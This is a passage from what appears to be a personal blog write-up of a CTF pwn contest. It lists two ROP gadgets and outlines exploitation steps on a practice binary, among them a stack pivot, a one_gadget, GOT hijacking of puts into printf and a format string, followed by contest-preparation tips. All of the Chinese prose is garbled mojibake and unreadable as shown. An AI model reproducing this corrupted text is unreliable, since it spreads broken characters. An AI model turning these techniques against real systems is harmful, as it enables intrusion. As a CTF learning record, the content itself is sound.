<p>äºæ˜¯æˆåŠŸçŠ¯ç—…äº†ï¼Œå…·ä½“æƒ…å†µæ˜¯ï¼Œç”¨ ROPgadget èƒ½çœ‹åˆ°ä¸‹é¢è¿™ä¸¤æ¡ gadgetï¼š</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-text">0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret  // [7]
0x000000000040121c : pop rbx ; ret
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-text">0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret  // [7]
0x000000000040121c : pop rbx ; ret
</code></pre></div>
<p>å¾ˆç»å…¸çš„ magic gadget äº†ï¼Œç›¸å½“äºç»™äº†ä»»æ„åœ°å€åŠ çš„åŸè¯­ï¼Œbut æˆ‘æ¯”èµ›æ—¶åªæƒ³èµ·æ¥ç”¨ ropper äº†ï¼Œè€Œ ropper æ‰¾ä¸åˆ° [7] è¿™æ¡é“¾å­ã€‚ã€‚ã€‚ã€‚</p>
<p>ç„¶åæˆ‘å°±åªèƒ½çº¯é£æ°´æ‰“ï¼Œï¼Œç©¶ææŠ˜ç£¨ã€‚</p>
<p><del>é¢„æœŸçš„è¯åº”è¯¥æ˜¯ï¼Œå…ˆæ ˆè¿ç§»åˆ° bss ä¸Šï¼Œç„¶å <code class="inline-code">call _start</code> åœ¨ bss ä¸Šå¸ƒç½® libcï¼Œé€šè¿‡ä»»æ„åŠ åŸè¯­æä¸€ä¸ª ogg å‡ºæ¥æ‹¿ä¸‹ã€‚</del></p>
<p>å¤ç°äº†ä¸€ä¸‹å‘ç°å‹æ ¹æ²¡å¿…è¦ <code class="inline-code">call _start</code>ï¼Œç›´æ¥ç”¨ bss ä¸Š <code class="inline-code">stdin</code> å°±èƒ½æå‡ºæ¥ä¸€ä¸ª oggã€‚</p>
<p>å“å“ï¼Œæˆ‘ä¸æ˜¯äººã€‚</p>
<p>äºæ˜¯æœ€åä¸€é“æ ¼å¼åŒ–ä¸²æ—¶é—´å½»åº•ä¸å¤Ÿäº†ï¼Œé€šè¿‡æ•°ç»„è¶Šç•Œå¯ä»¥å®ç°åŠ«æŒ gotï¼Œç„¶åæŠŠ <code class="inline-code">puts</code> åŠ«æŒæˆ <code class="inline-code">printf</code>ï¼Œè½¬æˆå †ä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæœ‰ä¸‰æ¬¡ï¼Œå¯ä»¥æ“ä½œå‡ºæ— é™æ¬¡ï¼Œç„¶åæ²¡æ—¶é—´äº†ã€‚ã€‚</p>
<p><strong>æ€»ç»“</strong>ï¼šäº”ä¸ªå°æ—¶çš„æ¯”èµ›ï¼Œåˆè¦æ‰“åˆè¦é˜²ï¼Œå…¶å®å¦‚æœä¸åœ¨æ ˆä¸Š stuck å®Œå…¨èƒ½å‡ºã€‚</p>
<h2 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>ç»éªŒ</a></h2>
<p>é¦–å…ˆæ‰“æ–­ç½‘çº¿ä¸‹èµ›ï¼Œä¸€å®šè¦ä¿è¯ç¯å¢ƒï¼Œå¤šè·Ÿé˜Ÿå‹äº¤æµï¼Œæ¯”èµ›å‰æŠŠç¯å¢ƒæµ‹è¯•å¥½ï¼Œä»¥å…å‡ºç°æ¯”èµ›æ—¶å‘ç° python èµ·ä¸äº† http.server ä¸”æ²¡æœ‰ U ç›˜çš„æƒ…å†µã€‚</p>
<p>æå‰æŠŠå„ä¸ªç‰ˆæœ¬çš„ libc-dbg.deb åŒ…éƒ½ä¸‹å¥½ï¼Œä»¥å…é‡åˆ°é¢˜ç›®æƒ³å¸¦æºç è°ƒè¯• IOFILE æ—¶æŠ“çã€‚</p>
<p>æ¯”èµ›å‰æŠŠæ¿å­ä»€ä¹ˆçš„å‡†å¤‡å¥½ï¼Œå¹³å¸¸å°±å¯ä»¥å¤šç§¯ç´¯ï¼Œæ¯”èµ›æ—¶äº‰åˆ†å¤ºç§’çš„ç¯å¢ƒä¸‹ä¸ä¸€å®šæœ‰æ—¶é—´æ…¢æ…¢å †é£æ°´ï¼Œè¿™ä¸ªæ—¶å€™æå‰å‡†å¤‡å¥½çš„å¯ä»¥ç›´æ¥å¥—ç”¨çš„é£æ°´ trick å°±æ´¾ä¸Šå¤§ç”¨åœºäº†ã€‚</p>
<p>å¦å¤–å­¦ä¼šçµæ´»ç”¨ patchelfï¼Œå¾ˆå¤šæ—¶å€™å‡ºé¢˜äººç»™çš„ ld å¹¶ä¸æ˜¯å¾ˆå¥½ç”¨ï¼Œpatch äº† libc åå¯ä»¥æ ¹æ® libc çš„ç‰ˆæœ¬æ¥é€‰æ‹©å¤§ç‰ˆæœ¬ä¸€è‡´å°ç‰ˆæœ¬æœ‰ä¸€ç‚¹ä¸ä¸€æ ·çš„ ld æ¥æ‰“ï¼Œä¹Ÿå¯ä»¥ç”¨ <a href="https://hub.docker.com/r/roderickchan/debug_pwn_env/tags" title="https://hub.docker.com/r/roderickchan/debug_pwn_env/tags" target="_blank" rel="noopener">docker env</a>ã€‚</p>
<p>å†å°±æ˜¯å¯ä»¥ä½¿ç”¨è”ç½‘åŠŸèƒ½ï¼Œæ¯”å¦‚ gdb çš„ debuginfod æœåŠ¡å™¨ å’Œ pwninit è¿™ç§å·¥å…·ï¼Œä½†æ˜¯è¦çŸ¥é“æ€ä¹ˆå…³/ä»£æ›¿ï¼Œä¸ç„¶æ–­ç½‘çš„æ—¶å€™æ¯æ¬¡è°ƒè¯•å‰éƒ½å¾—ç­‰å¾… web è®¿é—®è¶…æ—¶å¤ªæŠ˜ç£¨äº†ã€‚</p>
<p>æŠ€æœ¯å±‚é¢çš„ï¼š</p>
<ol>
<li>ogg çœŸå¾—ä¸€ä¸ªä¸€ä¸ªå°è¯•</li>
<li>ropper + ROPgadget</li>
</ol>
<p>å…¶å®è¿™ç§æ”¿æ²»æ¯”èµ›ä¸€èˆ¬æ²¡æœ‰ç‰¹åˆ«éš¾çš„é¢˜ç›®ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯éšä¾¿æ‰“ï¼Œå‰ææ˜¯ä¿è¯ç†Ÿç»ƒåº¦ + å°‘çŠ¯é”™ã€‚</p>
<p>æœ€åè¯´ä¸€å¥æˆ‘ä»¬æ˜¯å† å†›ï¼Œå››å·çœèµ› pwn è¿˜æ˜¯å¤ª 1z äº†ã€‚</p></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">ä¿æŒè”ç³»</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">Â·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">Â·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>æœ¬ç«™åŸºäº
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
æ”¹é€ ï¼Œé™¤ç‰¹åˆ«è¯´æ˜å¤–å†…å®¹ä»¥ CC BY 4.0 åè®®å…±äº«ã€‚</p></span></div></footer></body></html>